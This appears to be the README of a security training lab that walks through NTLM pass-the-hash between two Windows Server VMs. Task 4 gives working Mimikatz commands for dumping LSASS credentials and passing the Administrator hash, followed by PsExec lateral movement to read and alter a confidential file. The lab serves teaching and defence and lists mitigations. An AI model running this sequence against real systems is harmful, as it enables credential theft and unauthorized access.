# Windows Pass-the-Hash Lab

Hands-on Windows Server lab demonstrating how a compromised local administrator credential can be abused with NTLM pass-the-hash authentication to access another Windows server.

> **For authorized lab use only.** Run this exercise only on the provided, isolated training virtual machines. Never use Mimikatz, PsExec, or recovered hashes against systems you do not own or have explicit permission to test.

## Learning objectives

- Create and modify a file on a Windows server.
- Create a local Windows user.
- Use PsTools/PsExec to execute commands remotely.
- Understand how LSASS can expose authentication material to an administrator-level process.
- Demonstrate pass-the-hash authentication in a controlled environment.
- Verify the confidentiality and integrity impact of the attack.

## Lab topology

| Host | Operating system | Role |
|---|---|---|
| `ZYWIN01` | Windows Server 2022 | Source server; local user and Mimikatz activity |
| `ZYWIN02` | Windows Server 2022 | Target server; protected `confidential.txt` file |

The lab uses two Windows Server VMs. Keep both systems on the training network and do not expose them to an untrusted network.

## Repository layout

```text
windows-pass-the-hash-lab/
├── README.md
├── LICENSE
├── .gitignore
├── docs/
│   ├── defensive-notes.md
│   └── lab-report-template.md
└── scripts/
    ├── create-lab-user.ps1
    └── verify-lab.ps1
```

## Prerequisites

- Two Windows Server 2022 VMs named `ZYWIN01` and `ZYWIN02`.
- Administrator access to `ZYWIN01` while preparing the lab.
- Network connectivity between the VMs.
- PsTools installed at `C:\PsTools`.
- Mimikatz supplied by the authorized lab environment at `C:\mimikatz\x64`.
- A snapshot of both VMs before beginning.

## Walkthrough

### Task 1 — Create the protected file on ZYWIN02

1. Connect to `ZYWIN02`.
2. Open **File Explorer** and select **Desktop**.
3. Create a new text document named `confidential`.
4. Open it in Notepad and add sample content, for example:

   ```text
   This file contains confidential training data.
   ```

5. Save the file as `confidential.txt`.

You can confirm the file from PowerShell:

```powershell
Get-Content C:\Users\Administrator\Desktop\confidential.txt
```

### Task 2 — Create `testuser` on ZYWIN01

Use **Server Manager → Tools → Computer Management → Local Users and Groups → Users** and create:

| Field | Value |
|---|---|
| User name | `testuser` |
| Full name | `Test User` |
| Password | Use the password provided by your instructor; the walkthrough uses `p@2` |
| User must change password at next logon | Clear this option |

Or, from an elevated PowerShell window, use the included helper:

```powershell
Set-ExecutionPolicy -Scope Process Bypass
.\scripts\create-lab-user.ps1 -Password (Read-Host "Enter the lab password" -AsSecureString)
```

The script creates a standard local user and does not add it to Administrators.

### Task 3 — Log on as `testuser` and test PsExec

1. Sign out or use **Ctrl+Alt+Delete → Switch user**.
2. Sign in as `ZYWIN01\testuser`.
3. Open PowerShell and run:

```powershell
whoami
whoami /groups
```

The account should be a standard local user. From `C:\PsTools`, test remote execution:

```powershell
cd C:\PsTools
PsExec.exe \\ZYWIN02 cmd.exe
```

In the baseline state, the request should fail because `testuser` does not have the credentials or privileges required for remote administration on `ZYWIN02`.

### Task 4 — Demonstrate pass-the-hash in the isolated lab

This task requires an administrator-level PowerShell window on `ZYWIN01`.

```powershell
cd C:\mimikatz\x64
.\mimikatz.exe
```

Inside Mimikatz, enable debug privilege and request logon credential material:

```text
log passthehash.log
privilege::debug
sekurlsa::logonpasswords
```

Locate the authorized lab Administrator session and record its NTLM hash. Then, still inside Mimikatz, create a process using that hash:

```text
sekurlsa::pth /user:Administrator /domain:ZYWIN01 /ntlm:<LAB_ADMIN_NTLM_HASH>
```

The command opens a new shell. In that shell, confirm the effective identity and use PsExec:

```powershell
whoami
cd C:\PsTools
PsExec.exe \\ZYWIN02 cmd.exe
whoami
cd C:\Users\Administrator\Desktop
type confidential.txt
echo This file's content was viewed and modified. >> confidential.txt
```

The important observation is that the remote access used the NTLM hash rather than typing the Administrator password into PsExec.

### Task 5 — Confirm the impact on ZYWIN02

Reconnect to `ZYWIN02` and open:

```text
C:\Users\Administrator\Desktop\confidential.txt
```

The new line should be present. This demonstrates:

- **Confidentiality impact:** the file was read.
- **Integrity impact:** the file was modified.
- **Lateral movement:** access moved from `ZYWIN01` to `ZYWIN02`.

Run the verification helper on `ZYWIN02` if desired:

```powershell
Set-ExecutionPolicy -Scope Process Bypass
.\scripts\verify-lab.ps1
```

## Cleanup

After recording results:

1. Revert both VMs to their pre-lab snapshots.
2. If snapshots are unavailable, remove `testuser`, delete the training file, remove Mimikatz/PsTools, and clear lab logs according to your instructor's instructions.
3. Do not reuse the lab password or any recovered hash outside the lab.

## Defensive takeaways

- Prefer Kerberos and reduce legacy NTLM where compatibility permits.
- Use unique local administrator passwords with Windows LAPS or an equivalent solution.
- Avoid logging on privileged accounts to lower-trust servers.
- Restrict local-account network logons and remote administration paths.
- Apply least privilege and limit who can run administrator-level tooling.
- Monitor LSASS access, suspicious process creation, PsExec service creation, and unusual authentication between servers.
- Enable relevant Windows auditing and forward Security logs to a central platform.

See [`docs/defensive-notes.md`](docs/defensive-notes.md) for a short defensive checklist and [`docs/lab-report-template.md`](docs/lab-report-template.md) for report prompts.

## Disclaimer

This repository documents an intentionally vulnerable training scenario. It is not an endorsement of credential theft or unauthorized access. Use only with explicit authorization.
